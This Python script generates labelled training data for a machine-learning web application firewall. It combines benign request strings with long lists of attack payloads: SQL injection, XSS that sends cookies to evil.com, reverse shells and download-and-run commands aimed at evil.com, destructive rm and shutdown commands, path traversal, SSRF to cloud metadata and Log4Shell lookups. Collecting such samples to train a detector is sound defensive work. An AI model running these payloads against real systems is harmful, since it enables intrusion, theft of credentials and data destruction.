#!/usr/bin/env python
"""
scripts/generate_dataset.py
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Generates the training_data.csv dataset used to train the AI WAF classifier.
Combines curated SQLi, XSS, command injection, path traversal, and benign payloads.

Run once from the project root:
    python scripts/generate_dataset.py

Output: data/training_data.csv
"""

from __future__ import annotations

import csv
import random
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

# Labels: 0=benign, 1=sqli, 2=xss, 3=cmdi, 4=path_traversal, 5=generic_attack

BENIGN = 0
SQLI = 1
XSS = 2
CMDI = 3
PATH = 4
GENERIC = 5

# ---------------------------------------------------------------------------
# SQL Injection payloads
# ---------------------------------------------------------------------------
SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "\" OR \"1\"=\"1",
    "1' OR '1'='1'--", "1 OR 1=1", "admin'--", "admin' #",
    "' UNION SELECT null,null,null--", "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT null,table_name FROM information_schema.tables--",
    "1; DROP TABLE users--", "1; INSERT INTO admin VALUES('hacked','hacked')--",
    "1' AND SLEEP(5)--", "1 AND SLEEP(5)", "1; WAITFOR DELAY '0:0:5'--",
    "1' AND BENCHMARK(1000000,MD5(1))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
    "0x41424344", "0x61646d696e", "CHAR(65,68,77,73,78)",
    "1 AND 1=2 UNION SELECT username,password FROM users--",
    "' OR 'a'='a", "1' OR 'x'='x", "x' OR 1=1 LIMIT 1--",
    "'; EXEC xp_cmdshell('dir')--", "'; EXEC sp_MSforeachtable('DROP TABLE ?')--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178787671))",
    "admin' OR '1'='1' /*", "' OR 1=1 LIMIT 1 --",
    "1 UNION SELECT @@version,null,null",
    "' UNION SELECT username, password, 3 FROM users--",
    "1' GROUP BY CONCAT(version(),0x3a,floor(rand(0)*2)) HAVING MIN(0)--",
    "1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)--",
    "'; TRUNCATE TABLE users--",
    "1%27%20OR%20%271%27%3D%271", "%27%20OR%20%271%27%3D%271%20--",
    "' OR 'unusual' = 'unusual'", "1' AND '1'='1",
    "1 OR 2>1", "1 OR 1>0",
    "' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
    "1; SELECT * FROM information_schema.tables",
    "pgsleeep(5)--", "pg_sleep(5)--",
    "1' AND PG_SLEEP(5)--", "1 AND PG_SLEEP(5)",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "0; DROP TABLE--", "1 OR 1=1; --",
    "' OR ''-''", "' OR ''=''",
    "a' OR 1=1-- -", "1 ORDER BY 3--",
    "1 ORDER BY 100--", "1 GROUP BY 1,2--",
    "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--",
    "'; REVOKE ALL PRIVILEGES ON *.* FROM 'admin'@'localhost'--",
    "'; ALTER USER 'root'@'localhost' IDENTIFIED BY 'newpass'--",
    "select * from users", "select password from admin",
    "UNION SELECT user(), database(), version()--",
    "select load_file('/etc/passwd')", "into outfile '/var/www/shell.php'",
    "1 AND (SELECT COUNT(*) FROM mysql.user)>0--",
    "1' AND MID(version(),1,1)='5'--",
    "'; INSERT INTO users (username,password) VALUES ('hacker','hacker')--",
    "1'; CALL system('ls -la')--",
    "0x73656c656374", "0x554e494f4e", "0x75736572",
    "' AND SUBSTRING(username,1,1)='a'--",
    "' AND ASCII(SUBSTRING(password,1,1))>64--",
    "1 AND 1=(SELECT 1 FROM dual)--",
    "1 UNION SELECT sysobjects.name, syscolumns.name FROM sysobjects--",
    "' HAVING 1=1--", "' GROUP BY users.id HAVING 1=1--",
    "' ORDER BY 1--", "' ORDER BY 5--",
    "1' LIMIT 1 OFFSET 0--", "1 LIMIT 1,1",
    "/* comment */ SELECT 1",
    "/*!50000 SELECT*/ 1", "/*!UNION*/ SELECT 1",
    "1/**/UNION/**/SELECT/**/1,2,3",
    "1' AND/**/1=1--", "' AND 0x01=0x01--",
    "' OR 0x01",
    "1 AND (ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))))>64",
    "'; EXEC('SEL'+'ECT 1')--",
    "'; EXEC(0x53454c454354203120)--",
]

# ---------------------------------------------------------------------------
# XSS payloads
# ---------------------------------------------------------------------------
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert`1`>",
    "javascript:alert(1)",
    "javascript:alert('XSS')",
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<body onload=alert(1)>",
    "<div onmouseover=alert(1)>hover</div>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>window.location='http://evil.com?c='+document.cookie</script>",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<%73%63%72%69%70%74>alert(1)</%73%63%72%69%70%74>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<<SCRIPT>alert(1)//<</SCRIPT>",
    "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
    "<IMG SRC=javascript:alert('XSS')>",
    "vbscript:msgbox('XSS')",
    "<a href='vbscript:msgbox(1)'>click</a>",
    "expression(alert(1))",
    "<style>*{background:url('javascript:alert(1)')}</style>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    "';alert(1)//", "\";alert(1)//",
    "</title><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<form><button formaction=javascript:alert(1)>click",
    "document.write('<script>alert(1)</script>')",
    "eval('alert(1)')",
    "window.location='http://evil.com'",
    "<script>fetch('http://evil.com?data='+document.cookie)</script>",
    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
    "<audio src=1 href=1 onerror=\"javascript:alert(1)\">",
    "<video src=1 href=1 onerror=\"javascript:alert(1)\">",
    "<body background=javascript:alert(1)>",
    "<input type=text value=\"<script>alert(1)</script>\">",
    "onclick=alert(1)",
    "onmouseover=alert(1)",
    "onfocus=alert(1)",
    "onblur=alert(1)",
    "onchange=alert(1)",
    "onkeydown=alert(1)",
    "<svg><script>alert(1)</script></svg>",
    "<math href=javascript:alert(1)>click</math>",
    "¼script¾alert(1)¼/script¾",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    "';alert(String.fromCharCode(88,83,83))//';",
    "<script>\\u0061lert(1)</script>",
    "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(1)>",
    "<<script>alert(1);//<</script>",
    "</script><script>alert(1)</script>",
    "<script>alert(1)/*",
]

# ---------------------------------------------------------------------------
# Command Injection payloads
# ---------------------------------------------------------------------------
CMDI_PAYLOADS = [
    "; ls -la", "| ls", "& ls", "&& ls", "|| ls",
    "; cat /etc/passwd", "| cat /etc/passwd", "& cat /etc/passwd",
    "; id", "| id", "& id", "&& id",
    "`id`", "$(id)", "${IFS}id",
    "; wget http://evil.com/shell.sh -O /tmp/s && bash /tmp/s",
    "| wget http://evil.com/shell.sh", "& curl http://evil.com/c2",
    "; nc -e /bin/sh evil.com 4444",
    "| ncat evil.com 4444 -e /bin/bash",
    "; python -c 'import socket,subprocess;s=socket.socket();s.connect((\"evil.com\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno())'",
    "; perl -e 'use Socket;$i=\"evil.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "; ruby -rsocket -e 'f=TCPSocket.open(\"evil.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "| php -r '$sock=fsockopen(\"evil.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "; bash -i >& /dev/tcp/evil.com/4444 0>&1",
    "| bash -i >& /dev/tcp/evil.com/4444 0>&1",
    "; powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')\"",
    "& powershell -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')\"",
    "; cmd /c dir", "& cmd /c whoami", "| cmd /c ipconfig",
    "; dir", "| dir", "& dir",
    "$(cat /etc/passwd)", "`cat /etc/passwd`",
    "; echo vulnerable > /tmp/pwned",
    "| tee /tmp/pwned", "; touch /tmp/pwned",
    "; rm -rf /tmp/*", "& del /f /q C:\\Windows\\System32\\*",
    "; shutdown -h now", "& shutdown /s /f /t 0",
    "%0a ls", "%0d%0a ls", "%0aid", "\n ls", "\r\n ls",
    "1; ls #", "1 | ls #", "1 & ls #",
    "test$(id)test", "a`id`b",
    "1;{ls,-la}", "1|{cat,/etc/passwd}",
    "; find / -name '*.conf' 2>/dev/null",
    "| find / -perm -4000 -type f 2>/dev/null",
    "; env", "| printenv", "& set",
    "; uname -a", "| uname -r", "& ver",
    "; ps aux", "| ps -ef", "& tasklist",
    "; netstat -an", "| netstat -tulpn",
    "; ifconfig", "| ip addr", "& ipconfig /all",
]

# ---------------------------------------------------------------------------
# Path Traversal payloads
# ---------------------------------------------------------------------------
PATH_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "..%2Fetc%2Fpasswd", "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd",
    "..%252Fetc%252Fpasswd", "%252e%252e%252fetc%252fpasswd",
    "..\\etc\\passwd", "..\\..\\etc\\passwd",
    "..%5Cetc%5Cpasswd", "%2e%2e%5cetc%5cpasswd",
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini", "C:\\boot.ini",
    "/proc/self/environ", "/proc/version", "/proc/cmdline",
    "....//etc/passwd", "....\\\\etc\\passwd",
    "..././etc/passwd", "..\\.\\etc\\passwd",
    "%c0%ae%c0%ae%c0%af", "%c0%ae%c0%ae/etc/passwd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "////../../../etc/passwd",
    "..%c0%afetc%c0%afpasswd",
    "..%c1%9cetc%c1%9cpasswd",
    "/var/log/apache/access.log", "/var/log/nginx/access.log",
    "/var/www/html/.htpasswd", "/.htaccess",
    "../../../../../../../../../etc/passwd%00",
    "../../../../../../../../../../etc/passwd%00.jpg",
    "../../../../../../../../../windows/system32/cmd.exe",
    "..%00/etc/passwd", "..%0d/etc/passwd", "..%5c..%5cetc%5cpasswd",
    "/etc/mysql/my.cnf", "/etc/php.ini", "/etc/httpd/conf/httpd.conf",
    "/var/lib/mlocate/mlocate.db",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input", "php://stdin",
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    "expect://id", "expect://ls",
    "data://text/plain,<?php phpinfo();?>",
    "/../../../../../../etc/shadow",
    "../../../../windows/win.ini",
]

# ---------------------------------------------------------------------------
# Generic / other attack payloads
# ---------------------------------------------------------------------------
GENERIC_PAYLOADS = [
    # SSRF
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://localhost:8080/admin",
    "http://127.0.0.1:22/",
    "http://[::1]:80/",
    "dict://localhost:11211/",
    "gopher://localhost:6379/_PING",
    "ftp://anonymous@localhost/",
    # XXE
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
    "<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://evil.com/ssrf'>]>",
    "<!ENTITY % all '<!ENTITY &#x25; send SYSTEM \"http://evil.com/?%local;\">'>",
    # Template injection
    "{{7*7}}", "{{config}}", "{{self.__dict__}}", "${7*7}", "#{7*7}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
    "<%= 7 * 7 %>", "<%= system('id') %>",
    # Open redirect
    "http://evil.com", "//evil.com", "///evil.com",
    "/%09/evil.com", "/%2F/evil.com",
    "http://legit.com@evil.com",
    # Log4Shell
    "${jndi:ldap://evil.com/a}", "${jndi:rmi://evil.com/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/a}",
    "${${lower:jndi}:${lower:rmi}://evil.com/a}",
    # Prototype pollution
    "__proto__[admin]=true", "constructor.prototype.admin=true",
    "?__proto__[shell]=touch${IFS}/tmp/pwned",
    # Deserialization
    "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
    "aced0005737200", "O:4:\"Slim\"",
]

# ---------------------------------------------------------------------------
# Benign payloads (normal web traffic)
# ---------------------------------------------------------------------------
BENIGN_PAYLOADS = [
    # Normal search queries
    "search=hello+world", "q=python+tutorial", "query=how+to+cook+pasta",
    "q=best+hotels+in+paris", "search=laptop+under+1000",
    "q=what+is+machine+learning", "search=docker+tutorial+beginners",
    # Normal login attempts
    "username=john&password=MySecureP%40ss123",
    "username=alice&password=correct-horse-battery-staple",
    "email=user%40example.com&password=P%40ssw0rd",
    # Normal form submissions
    "name=John+Doe&email=john%40example.com&message=Hello+there",
    "firstname=Jane&lastname=Smith&phone=%2B1-555-0100",
    "address=123+Main+St&city=Springfield&state=IL&zip=62701",
    # Normal API calls
    "user_id=12345&action=view&format=json",
    "page=1&per_page=20&sort=created_at&order=desc",
    "category=electronics&brand=Samsung&min_price=100&max_price=500",
    "lat=40.7128&lng=-74.0060&radius=10&unit=km",
    # Normal file paths
    "/images/logo.png", "/css/main.css", "/js/app.js",
    "/api/v1/users", "/api/v2/products/42",
    "/blog/2024/01/my-first-post",
    "/docs/getting-started",
    "/static/media/photo.jpg",
    # Normal user agents (as body content)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    # Normal content
    "Hello, how are you today?",
    "Please send me information about your products.",
    "I would like to reset my password.",
    "My order number is 12345 and I have a question.",
    "Thank you for your help with the issue.",
    "Can you please update my shipping address?",
    "I am interested in the premium subscription plan.",
    "The product arrived damaged, please help.",
    "I need to cancel my order #98765.",
    # Normal URLs
    "https://www.example.com/products?id=42&ref=homepage",
    "https://api.example.com/v1/users?page=2&limit=10",
    "https://shop.example.com/cart?item=123&qty=2&coupon=SAVE10",
    # Normal numbers and IDs
    "id=1", "id=42", "id=100", "page=1", "page=2",
    "user=admin", "role=user", "status=active",
    "count=10", "limit=25", "offset=50",
    # Normal dates
    "date=2024-01-15", "from=2024-01-01&to=2024-12-31",
    "created_after=2023-06-01T00:00:00Z",
    # Normal text with special chars (not attacks)
    "comment=Great product! Worth every penny.",
    "bio=I'm a software developer with 5+ years of experience.",
    "description=This & That: A Guide to Modern Cooking",
    "title=C# vs C++: Which Should You Learn?",
    "note=Please call at 3pm - John",
    "message=Hi! I'd like to know more about your services.",
    # Normal encoded content
    "name=Fran%C3%A7ois&city=Montr%C3%A9al",
    "q=caf%C3%A9+near+me",
    "search=na%C3%AFve+algorithm",
    # Normal JSON-like content
    '{"name": "John", "age": 30, "city": "New York"}',
    '{"action": "login", "user": "alice", "timestamp": 1705000000}',
    '{"items": [1, 2, 3], "total": 3, "page": 1}',
    # Normal multipart/form names
    "file.txt", "report_2024.pdf", "profile_picture.jpg",
    "data_export_2024_01_15.csv",
    # Normal redirect URLs (benign)
    "/dashboard", "/profile/settings", "/checkout/success",
    "/api/callback?code=abc123&state=xyz789",
    # Math and numbers (not hex injection)
    "value=3.14159", "amount=100.00", "discount=0.15",
    "score=95.5", "temperature=23.4",
    # Normal CSS class / HTML attribute values (not XSS)
    "class=btn btn-primary", "style=color:red", "color=blue",
    "width=100px", "height=auto",
    # Normal base64 (e.g. image upload previews)
    "preview=iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
    # More benign queries
    "action=update&field=email&value=new%40email.com",
    "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0",
    "session=abc123def456ghi789",
    "referrer=https%3A%2F%2Fwww.google.com%2F",
    "callback=https%3A%2F%2Fmyapp.com%2Fauth%2Fcallback",
    "lang=en-US", "locale=fr_FR", "timezone=America%2FNew_York",
    "format=json", "format=xml", "format=csv",
    "download=true", "preview=false", "debug=false",
    "v=2", "version=3.1.4", "api_version=2024-01",
    "client_id=my-app-client-id",
    "redirect_uri=https%3A%2F%2Fmyapp.com%2Foauth%2Fcallback",
    "scope=read+write+profile",
]

# ---------------------------------------------------------------------------
# Sneaky bypass payloads (advanced evasion techniques)
# ---------------------------------------------------------------------------
SNEAKY_SQLI_PAYLOADS = [
    # Whitespace-alternative encoding (vertical tabs, form feeds)
    "1%0bOR%0bround(pi())%3d3%0bAND%0b1%3d1",
    "id=1%0bOR%0bround(pi())%3d3",
    "1%0bAND%0bsin(pi())%3d0",
    "1%0bUNION%0bSELECT%0b1,2,3",
    "admin%0b'OR'%0b'1'%3D'1",
    # Math-function obfuscation
    "1 AND ROUND(PI())=3",
    "1 OR COS(0)=1",
    "1 AND SIN(PI()/2)=1",
    "1 OR EXP(0)=1 AND 1=1",
    "1 OR POWER(1,1)=1",
    # Unicode/exotic whitespace
    "1\u00a0OR\u00a01=1",  # non-breaking space
    "1\u2003OR\u20031=1",  # em space
    # Polyglot payloads (cross-context)
    "1'\">\u003csvg/onload=prompt(1)\u003e// OR 1=1--",
    "'-confirm(1)-'",
    "1;SELECT IF(1=1,SLEEP(5),0)--",
    # Comment-based whitespace
    "1/**/OR/**/1=1",
    "1'/**/UNION/**/SELECT/**/1,2,3--",
    # HTTP parameter pollution
    "id=1&id=1' OR '1'='1",
    # Null byte injection
    "admin%00' OR '1'='1",
    "1' OR '1'='1'%00--",
]


# ---------------------------------------------------------------------------
# Dataset builder
# ---------------------------------------------------------------------------

def build_dataset() -> list[tuple[str, int]]:
    rows: list[tuple[str, int]] = []

    # Add all curated payloads
    for p in SQLI_PAYLOADS:
        rows.append((p, SQLI))
    for p in XSS_PAYLOADS:
        rows.append((p, XSS))
    for p in CMDI_PAYLOADS:
        rows.append((p, CMDI))
    for p in PATH_PAYLOADS:
        rows.append((p, PATH))
    for p in GENERIC_PAYLOADS:
        rows.append((p, GENERIC))
    for p in BENIGN_PAYLOADS:
        rows.append((p, BENIGN))
    for p in SNEAKY_SQLI_PAYLOADS:
        rows.append((p, SQLI))

    # Augment: combine benign parts to simulate real query strings
    random.seed(42)
    benign_parts = [
        "name=Alice", "id=7", "page=3", "q=test", "sort=asc",
        "filter=active", "category=books", "limit=20", "offset=0",
        "token=abcdef", "lang=en", "format=json", "debug=false",
        "user=bob", "email=bob%40example.com",
    ]
    for _ in range(300):
        k = random.randint(1, 5)
        parts = random.sample(benign_parts, min(k, len(benign_parts)))
        rows.append(("&".join(parts), BENIGN))

    # Augment: realistic URL paths (benign)
    benign_paths = [
        "/api/v1/users/42", "/products/search?q=laptop", "/checkout/cart",
        "/blog/2024/machine-learning-basics", "/static/css/app.min.css",
        "/images/products/shoe-42.webp", "/admin/dashboard",
        "/settings/profile/update", "/api/v2/orders?status=pending&page=1",
        "/docs/api-reference#authentication", "/health", "/favicon.ico",
        "/sitemap.xml", "/robots.txt", "/.well-known/acme-challenge/token123",
        "/api/webhooks/stripe", "/oauth/callback?code=abc&state=xyz",
    ]
    for p in benign_paths:
        rows.append((p, BENIGN))

    # Augment: realistic user-agent strings (benign)
    benign_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
        "PostmanRuntime/7.32.3", "python-requests/2.31.0",
        "curl/8.4.0", "Googlebot/2.1 (+http://www.google.com/bot.html)",
    ]
    for a in benign_agents:
        rows.append((a, BENIGN))

    # Augment: realistic JSON bodies (benign)
    benign_json = [
        '{"username": "alice", "password": "correct-horse-battery"}',
        '{"action": "update", "fields": {"name": "Bob Smith", "email": "bob@example.com"}}',
        '{"items": [{"id": 42, "qty": 2}, {"id": 15, "qty": 1}], "coupon": "SAVE10"}',
        '{"query": "how to learn python", "page": 1, "limit": 20}',
        '{"latitude": 40.7128, "longitude": -74.0060, "radius_km": 5}',
        '{"notification_type": "email", "enabled": true, "frequency": "daily"}',
        '{"file_name": "report_q4_2024.pdf", "format": "pdf", "size_bytes": 2048576}',
    ]
    for j in benign_json:
        rows.append((j, BENIGN))

    # Augment: SQL payloads embedded in realistic query strings
    sqli_embeds = [
        f"id={p}" for p in ["1' OR '1'='1", "1 UNION SELECT 1,2,3--", "0x41"]
    ] + [
        f"name={p}" for p in ["admin'--", "' OR 1=1#"]
    ] + [
        f"search={p}" for p in ["' UNION SELECT null--", "1; DROP TABLE users--"]
    ] + [
        f"user={p}" for p in ["' OR 1=1--", "admin' AND 1=1--"]
    ] + [
        f"q={p}" for p in ["' UNION ALL SELECT @@version--", "1'; SLEEP(5)--"]
    ]
    for p in sqli_embeds:
        rows.append((p, SQLI))

    # Augment: XSS payloads embedded in realistic params
    xss_embeds = [
        f"comment={p}" for p in [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "javascript:alert(1)", "<svg onload=alert(1)>",
        ]
    ] + [
        f"name={p}" for p in ["<script>alert(1)</script>", "onerror=alert(1)"]
    ] + [
        f"q={p}" for p in [
            "<img src=x onerror=alert(document.cookie)>",
            "'\"><script>fetch('http://evil.com')</script>",
        ]
    ]
    for p in xss_embeds:
        rows.append((p, XSS))

    # Augment: command injection embedded in params
    cmdi_embeds = [
        f"filename={p}" for p in [
            "test.txt; cat /etc/passwd", "report.pdf | id",
            "file.txt && wget http://evil.com/shell.sh",
        ]
    ] + [
        f"host={p}" for p in [
            "localhost; id", "example.com | cat /etc/shadow",
        ]
    ]
    for p in cmdi_embeds:
        rows.append((p, CMDI))

    # Shuffle for good measure
    random.shuffle(rows)
    return rows


def main() -> None:
    out_path = Path("data/training_data.csv")
    out_path.parent.mkdir(parents=True, exist_ok=True)

    rows = build_dataset()
    label_counts = {}
    for _, label in rows:
        label_counts[label] = label_counts.get(label, 0) + 1

    with open(out_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f, quoting=csv.QUOTE_ALL)
        writer.writerow(["payload", "label"])
        writer.writerows(rows)

    print(f"[OK] Dataset written to {out_path}")
    print(f"   Total samples : {len(rows)}")
    label_names = {0: "benign", 1: "sqli", 2: "xss", 3: "cmdi", 4: "path", 5: "generic"}
    for k, v in sorted(label_counts.items()):
        print(f"   {label_names.get(k, k):15s} : {v}")


if __name__ == "__main__":
    main()

